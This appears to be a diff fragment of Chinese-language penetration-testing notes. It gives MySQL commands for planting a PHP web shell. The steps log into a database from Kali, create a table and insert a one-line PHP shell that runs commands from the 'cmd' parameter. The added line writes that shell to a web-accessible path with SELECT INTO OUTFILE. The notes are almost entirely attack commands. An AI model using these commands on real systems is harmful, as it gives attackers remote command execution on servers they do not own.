@@ -85,3 +85,4 @@ kali终端访问mysql数据库 mysql -u 用户名 -h 主机ip -p 密码
 切换数据库 use mysql
 创建一个表 create table aa(packet text) type=MYISaM;
 插入一条数据 INSERT INTO aa (packet) VALUES('<pre><body bgcolor=silver><? @system( $_GET["cmd"]); ?></body></pre>');
+将插入的数据在数据库服务器上创建个文件 select  * into outfile '网站可访问和可写的路径' from aa;
